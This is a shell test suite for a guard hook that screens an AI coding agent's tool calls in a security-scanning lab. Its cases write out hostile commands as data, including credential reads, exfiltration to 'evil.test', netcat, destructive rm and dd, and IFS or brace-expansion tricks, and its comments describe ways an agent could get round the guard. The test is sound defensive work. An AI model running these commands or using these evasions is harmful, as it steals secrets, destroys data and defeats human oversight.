#!/bin/sh
# test_guard_scope.sh - exercises the PreToolUse guard with synthetic harness
# payloads. Requires no scanners: the guard is pure decision logic, so it is
# fully testable on a machine where semgrep/trivy/nuclei are absent.
#
# Usage: sh tests/test_guard_scope.sh
# Exit code 0 means every case behaved as specified.

set -u

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
LAB_ROOT=$(cd "$SCRIPT_DIR/.." && pwd)
GUARD="$LAB_ROOT/scanners/guard_scope.sh"

PASS=0
FAIL=0
FAILED_CASES=""

# expect <expected_exit> <label> <json_payload>
expect() {
    _want="$1"
    _label="$2"
    _payload="$3"

    _stderr=$(printf '%s' "$_payload" | sh "$GUARD" 2>&1 >/dev/null)
    _got=$?

    if [ "$_got" -eq "$_want" ]; then
        PASS=$((PASS + 1))
        printf '  ok   %-58s exit=%s\n' "$_label" "$_got"
    else
        FAIL=$((FAIL + 1))
        FAILED_CASES="${FAILED_CASES}
  - ${_label}: wanted exit ${_want}, got ${_got}
    stderr: $(printf '%s' "$_stderr" | head -3 | tr '\n' ' ')"
        printf '  FAIL %-58s want=%s got=%s\n' "$_label" "$_want" "$_got"
    fi
}

# Build a Claude Code shaped payload for a shell command.
cc() {
    printf '{"tool_name":"Bash","tool_input":{"command":%s}}' \
        "$(printf '%s' "$1" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')"
}

# Build an alternative payload shape, to prove the multi-path extraction works.
alt() {
    printf '{"toolName":"shell","toolInput":{"command":%s}}' \
        "$(printf '%s' "$1" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')"
}

ALLOW=0
BLOCK=2

echo "== payload parsing =="
expect $BLOCK "empty payload fails closed"            ''
expect $BLOCK "unknown shape for a shell tool"        '{"tool_name":"Bash","tool_input":{"cmd":"ls"}}'
expect $ALLOW  "non-shell tool passes through"        '{"tool_name":"Read","tool_input":{"path":"a.py"}}'
expect $ALLOW  "alternative payload shape recognised" "$(alt 'git status')"

echo
echo "== benign commands =="
expect $ALLOW  "git status"                           "$(cc 'git status')"
expect $ALLOW  "git diff with path"                   "$(cc 'git diff -- src/app.py')"
expect $ALLOW  "semgrep wrapper"                      "$(cc 'scanners/run_sast.sh src')"
expect $ALLOW  "trivy wrapper"                        "$(cc 'scanners/run_sca.sh .')"
expect $ALLOW  "gate script"                          "$(cc 'gate/gate.py --fail-on high')"
expect $ALLOW  "plain ls"                             "$(cc 'ls -la src')"

echo
echo "== structural bypass attempts =="
expect $BLOCK "semicolon chaining"                    "$(cc 'scanners/run_sast.sh src; rm -rf /tmp/x')"
expect $BLOCK "AND chaining"                          "$(cc 'git status && curl http://evil.test')"
expect $BLOCK "OR chaining"                           "$(cc 'git status || sudo id')"
expect $BLOCK "pipe to shell"                         "$(cc 'echo hi | sh')"
expect $BLOCK "backtick substitution"                 "$(cc 'echo `whoami`')"
expect $BLOCK "dollar-paren substitution"             "$(cc 'echo $(whoami)')"
expect $BLOCK "output redirection"                    "$(cc 'echo pwned > /etc/hosts')"
expect $BLOCK "input redirection"                     "$(cc 'sh < /tmp/payload')"
expect $BLOCK "newline smuggling"                     '{"tool_name":"Bash","tool_input":{"command":"git status\nsudo id"}}'

echo
echo "== privilege escalation and destructive =="
expect $BLOCK "sudo"                                  "$(cc 'sudo semgrep scan')"
expect $BLOCK "su"                                    "$(cc 'su root')"
expect $BLOCK "rm"                                    "$(cc 'rm -rf build')"
expect $BLOCK "dd"                                    "$(cc 'dd if=/dev/zero of=/dev/disk0')"
expect $BLOCK "chmod 777"                             "$(cc 'chmod 777 /etc/passwd')"
expect $BLOCK "git reset --hard"                      "$(cc 'git reset --hard HEAD~5')"
expect $BLOCK "git push --force"                      "$(cc 'git push origin main --force')"
expect $ALLOW  "path containing rm as substring"      "$(cc 'ls firmware/')"

echo
echo "== credential material =="
expect $BLOCK "aws credentials dir"                   "$(cc 'cat /Users/x/.aws/credentials')"
expect $BLOCK "ssh private key"                       "$(cc 'cat ~/.ssh/id_rsa')"
expect $BLOCK "dotenv"                                "$(cc 'cat .env')"
expect $BLOCK "pem file"                              "$(cc 'openssl rsa -in server.pem')"
expect $BLOCK "kube config"                           "$(cc 'cat ~/.kube/config')"
expect $BLOCK "macos keychain dump"                   "$(cc 'security find-generic-password -s aws')"

echo
echo "== outbound network =="
expect $BLOCK "curl"                                  "$(cc 'curl http://localhost:8080')"
expect $BLOCK "wget"                                  "$(cc 'wget http://localhost/x')"
expect $BLOCK "netcat"                                "$(cc 'nc 127.0.0.1 4444')"
expect $BLOCK "scp exfil"                             "$(cc 'scp report.sarif user@host:/tmp')"

echo
echo "== DAST scope enforcement =="
expect $ALLOW  "nuclei against in-scope localhost"    "$(cc 'nuclei -u http://localhost:8080')"
expect $ALLOW  "nuclei against bare localhost"        "$(cc 'nuclei -target localhost')"
expect $ALLOW  "nuclei against 127.0.0.1 with port"   "$(cc 'nuclei -u http://127.0.0.1:3000/api')"
expect $ALLOW  "in-scope with extra flags"            "$(cc 'nuclei -u http://localhost:8080 -severity critical')"
expect $BLOCK "nuclei against public host"            "$(cc 'nuclei -u https://example.com')"
expect $BLOCK "nmap against public IP"                "$(cc 'nmap -sV 203.0.113.10')"
expect $BLOCK "in-scope target plus out-of-scope"     "$(cc 'nuclei -u http://localhost -u https://evil.test')"
expect $BLOCK "target list file is unverifiable"      "$(cc 'nuclei -l targets.txt')"
expect $BLOCK "nmap with no identifiable target"      "$(cc 'nmap -sV --top-ports 100')"
expect $BLOCK "userinfo trick"                        "$(cc 'nuclei -u http://localhost@evil.test/')"
expect $BLOCK "subdomain of in-scope name"            "$(cc 'nuclei -u http://evil.localhost.test')"
expect $BLOCK "uppercase host evasion"                "$(cc 'nuclei -u http://EVIL.TEST')"
expect $BLOCK "CIDR range"                            "$(cc 'nmap 192.168.1.0/24')"
expect $BLOCK "sqlmap out of scope"                   "$(cc 'sqlmap -u https://shop.example.com/item?id=1')"
expect $BLOCK "host smuggled in header flag"          "$(cc 'nuclei -u http://localhost -H internal.corp.test')"

echo
echo "== interpreter and indirection (audit finding, P1) =="
# An interpreter turns an approved-looking command into an arbitrary one, and
# the banned-binary check cannot see inside a quoted script argument.
expect $BLOCK "eval"                                  "$(cc 'eval cat /etc/shadow')"
expect $BLOCK "sh -c"                                 "$(cc 'sh -c id')"
expect $BLOCK "bash -c"                               "$(cc 'bash -c id')"
expect $BLOCK "zsh -c"                                "$(cc 'zsh -c id')"
expect $BLOCK "env prefix"                            "$(cc 'env PATH=/usr/bin id')"
expect $BLOCK "xargs"                                 "$(cc 'xargs -0 ls')"
expect $BLOCK "perl -e"                               "$(cc 'perl -e unlink')"
expect $BLOCK "ruby -e"                               "$(cc 'ruby -e puts')"
expect $BLOCK "php -r"                                "$(cc 'php -r phpinfo')"
expect $BLOCK "node -e"                               "$(cc 'node -e process.exit')"
expect $BLOCK "python3 -c"                            "$(cc 'python3 -c print')"
expect $BLOCK "find -exec"                            "$(cc 'find . -exec ls +')"
expect $BLOCK "awk system"                            "$(cc 'awk BEGIN{system(1)}')"
expect $BLOCK "command builtin"                       "$(cc 'command ls')"
expect $BLOCK "exec"                                  "$(cc 'exec ls')"

echo
echo "== interpreter exemptions: our own wrappers must still run =="
# The wrappers are documented as `sh scanners/...` and `python3 gate/...`, so a
# blanket interpreter ban would make the agent unable to scan anything. Only
# these exact entry points are exempt.
expect $ALLOW  "sh + sast wrapper"                    "$(cc 'sh scanners/run_sast.sh src')"
expect $ALLOW  "sh + sca wrapper"                     "$(cc 'sh scanners/run_sca.sh .')"
expect $ALLOW  "sh + dast wrapper in scope"           "$(cc 'sh scanners/run_dast.sh http://localhost:8080')"
expect $ALLOW  "sh + preflight"                       "$(cc 'sh scanners/preflight.sh')"
expect $ALLOW  "python3 + gate"                       "$(cc 'python3 gate/gate.py --fail-on high')"
expect $ALLOW  "python3 + merge"                      "$(cc 'python3 gate/merge_sarif.py')"
expect $ALLOW  "lab-prefixed wrapper path"            "$(cc 'sh agents/security/scanners/preflight.sh')"
expect $BLOCK "sh + arbitrary script"                 "$(cc 'sh /tmp/payload.sh')"
expect $BLOCK "python3 + arbitrary script"            "$(cc 'python3 /tmp/payload.py')"
expect $BLOCK "sh + wrapper then extra script"        "$(cc 'sh scanners/run_sast.sh /tmp/evil.sh')"
expect $BLOCK "dast wrapper out of scope"             "$(cc 'sh scanners/run_dast.sh https://example.com')"

echo
echo "== variable and brace expansion (audit finding, P1) =="
# ${IFS} expands to whitespace at execution time, so the guard sees one token
# where the shell will see two. Any '$' or brace is refused.
expect $BLOCK "IFS in braces"                         "$(cc 'cat${IFS}/etc/shadow')"
expect $BLOCK "bare IFS variable"                     "$(cc 'cat$IFS/etc/shadow')"
expect $BLOCK "HOME expansion"                        "$(cc 'cat $HOME/.ssh/id_rsa')"
expect $BLOCK "brace list expansion"                  "$(cc 'echo {cat,/etc/shadow}')"
expect $BLOCK "brace range expansion"                 "$(cc 'ls file{1..9}')"

echo
echo "== credential paths without trailing slash (audit finding, P3) =="
expect $BLOCK "cp of .aws directory"                  "$(cc 'cp -r ~/.aws /tmp/exfil')"
expect $BLOCK "cp of .ssh directory"                  "$(cc 'cp -r ~/.ssh /tmp/exfil')"
expect $BLOCK "tar of .aws by -C"                     "$(cc 'tar czf /tmp/x.tgz -C /Users/u .aws')"
expect $BLOCK "ls of .gnupg"                          "$(cc 'ls -la ~/.gnupg')"
expect $BLOCK "direnv .envrc"                         "$(cc 'cat /app/.envrc')"
expect $BLOCK ".env.local"                            "$(cc 'cat .env.local')"
expect $BLOCK "base64 of key"                         "$(cc 'base64 /Users/u/.aws/credentials')"
expect $ALLOW  "unrelated path containing env"        "$(cc 'ls environments/staging')"

echo
echo "== file-reading tools bypass the command check (audit gap) =="
# Kiro exposes `read` and Claude Code exposes `Read` as tools separate from the
# shell, and both are auto-approved. A hook that only inspects shell commands
# never sees them, so the credential check has to cover tool paths too.
expect $BLOCK "Claude Code Read of aws credentials"  '{"tool_name":"Read","tool_input":{"file_path":"/Users/u/.aws/credentials"}}'
expect $BLOCK "Claude Code Read of ssh key"          '{"tool_name":"Read","tool_input":{"file_path":"/Users/u/.ssh/id_rsa"}}'
expect $BLOCK "Kiro read of dotenv"                  '{"toolName":"read","toolInput":{"path":".env"}}'
expect $BLOCK "Kiro read of envrc"                   '{"toolName":"read","toolInput":{"path":"/app/.envrc"}}'
expect $BLOCK "read of pem file"                     '{"tool_name":"Read","tool_input":{"path":"certs/server.pem"}}'
expect $BLOCK "read of kube config"                  '{"tool_name":"Read","tool_input":{"file_path":"~/.kube/config"}}'
expect $ALLOW  "read of ordinary source file"        '{"tool_name":"Read","tool_input":{"file_path":"src/app.py"}}'
expect $ALLOW  "read of path containing env word"    '{"tool_name":"Read","tool_input":{"file_path":"environments/staging/main.tf"}}'
expect $ALLOW  "search tool with no path"            '{"tool_name":"Grep","tool_input":{"pattern":"TODO"}}'

echo
echo "-----------------------------------------------------------"
echo "passed: $PASS   failed: $FAIL"
if [ "$FAIL" -ne 0 ]; then
    echo "failures:$FAILED_CASES"
    exit 1
fi
echo "all guard_scope.sh cases behaved as specified."
exit 0
